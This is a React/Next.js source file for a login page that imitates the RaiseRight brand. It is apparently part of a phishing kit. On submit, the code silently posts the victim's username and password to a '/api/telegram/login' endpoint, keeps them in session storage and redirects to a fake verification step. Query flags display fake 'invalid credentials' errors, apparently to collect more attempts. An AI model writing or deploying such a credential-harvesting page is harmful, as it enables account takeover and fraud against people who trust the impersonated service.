"use client"

import { useLayoutEffect, useState, type FormEvent } from "react"
import { useRouter } from "next/navigation"
import {
  MSG_LOGIN_INVALID_CREDENTIALS,
  MSG_UNABLE_VERIFY_TIME,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages"
import { wait } from "@/lib/loading-delays"
import { storeLoginCredentials } from "@/lib/login-flow-storage"

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoginLoading, setIsLoginLoading] = useState(false)
  const [loginError, setLoginError] = useState<string | null>(null)
  const router = useRouter()

  useLayoutEffect(() => {
    const params = new URLSearchParams(window.location.search)
    if (params.get("loginDenied") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_LOGIN_INVALID_CREDENTIALS)
      window.history.replaceState({}, "", "/")
      return
    }
    if (params.get("verifyUnavailable") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_UNABLE_VERIFY_TIME)
      window.history.replaceState({}, "", "/")
    }
  }, [])

  const handleSignIn = async (event: FormEvent) => {
    event.preventDefault()
    if (isLoginLoading || !username.trim() || !password.trim()) return
    setLoginError(null)
    setIsLoginLoading(true)

    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: username.trim(),
        password: password.trim(),
      }),
    }).catch(() => {})

    try {
      sessionStorage.setItem("loginReady", "1")
      storeLoginCredentials(username.trim(), password.trim())
      sessionStorage.setItem("maskedEmail", "**********")
      sessionStorage.setItem("maskedPhone", "***-***-****")
    } catch {
      // continue
    }

    await wait(SIGN_IN_LOADING_MS)
    router.push("/verify-choice")
  }

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="mt-10">
        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
          <h1 className="mb-10 text-center text-5xl font-light tracking-tight text-[#294d73]">
            Sign In
          </h1>

          <form onSubmit={handleSignIn}>
            <div className="mb-6">
              <div className="bg-gray-50">
                <label
                  htmlFor="username"
                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
                >
                  Username
                </label>
                <input
                  id="username"
                  type="text"
                  autoComplete="username"
                  placeholder="Enter username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-0 border-b border-[#28577f] px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
                />
              </div>

              <div className="mt-2 flex justify-end">
                <button
                  type="button"
                  onClick={() => router.push("/forgot-id")}
                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold"
                >
                  Forgot Username
                </button>
              </div>
            </div>

            <div className="mb-15">
              <div className="bg-gray-50">
                <label
                  htmlFor="password"
                  className="mb-2 block text-base font-medium text-[#28577f] px-3"
                >
                  Password
                </label>

                <div className="flex items-center border-b border-[#28577f]">
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    autoComplete="current-password"
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border-0 px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
                  />

                  <button
                    id="showPassword"
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="mb-2 ml-3 shrink-0 text-lg text-gray-600 hover:text-[#1d64a3]"
                  >
                    {showPassword ? "HIDE" : "SHOW"}
                  </button>
                </div>
              </div>
              <div className="mt-2 flex justify-end">
                <button
                  type="button"
                  onClick={() => router.push("/forgot-password")}
                  className="text-md text-[#1d64a3] underline underline-offset-2 hover:text-[#16496f] font-semibold"
                >
                  Forgot Password
                </button>
              </div>
            </div>

            {loginError ? (
              <p className="mb-4 text-red-600 text-base" role="alert">
                {loginError}
              </p>
            ) : null}

            <button
              type="submit"
              disabled={isLoginLoading}
              className="h-16 w-full rounded-full bg-[#1d64a3] text-xl font-semibold text-white transition hover:bg-[#076db7] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoginLoading ? "Signing in..." : "Sign In"}
            </button>
          </form>

          <div className="mt-4 text-center">
            <button
              type="button"
              onClick={() => router.back()}
              className="text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f]"
            >
              Back
            </button>
          </div>

          <div className="mt-6 text-center">
            <p className="mb-6 text-xl text-gray-600">Don&apos;t have an account?</p>
            <button
              type="button"
              onClick={() => router.push("/new-user")}
              className="pb-20 text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f]"
            >
              Enroll Here
            </button>
          </div>
        </section>
      </main>
    </div>
  )
}
